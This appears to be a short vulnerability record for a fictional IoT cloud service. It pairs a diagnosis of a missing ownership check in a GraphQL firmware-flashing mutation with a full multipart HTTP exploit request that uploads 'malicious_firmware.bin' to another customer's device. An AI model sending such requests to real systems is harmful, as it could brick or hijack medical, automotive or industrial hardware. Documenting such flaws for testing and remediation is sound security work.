diagnosis: The IoT firmware update GraphQL mutation dispatches over-the-air (OTA) firmware binaries to physical hardware identified by device_uuid. The resolver checks authentication but does not verify whether the authenticated user's organization owns or manages device_uuid. An attacker can flash malicious or corrupted firmware onto another customer's connected medical, automotive, or industrial devices, causing hardware failure or device takeover.
exploit_request:
POST /graphql HTTP/1.1
Host: iot-cloud.smartfleet.net
Authorization: Bearer <attacker_jwt>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoT

------WebKitFormBoundaryIoT
Content-Disposition: form-data; name="operations"

{"query": "mutation ($f: Upload!) { flashDeviceFirmware(deviceUuid: \"dev_fleet_sensor_9901\", firmware: $f) { deviceUuid status } }", "variables": {"f": null}}
------WebKitFormBoundaryIoT
Content-Disposition: form-data; name="map"

{"0": ["variables.f"]}
------WebKitFormBoundaryIoT
Content-Disposition: form-data; name="0"; filename="malicious_firmware.bin"
Content-Type: application/octet-stream

[Firmware Binary Bytes]
------WebKitFormBoundaryIoT--
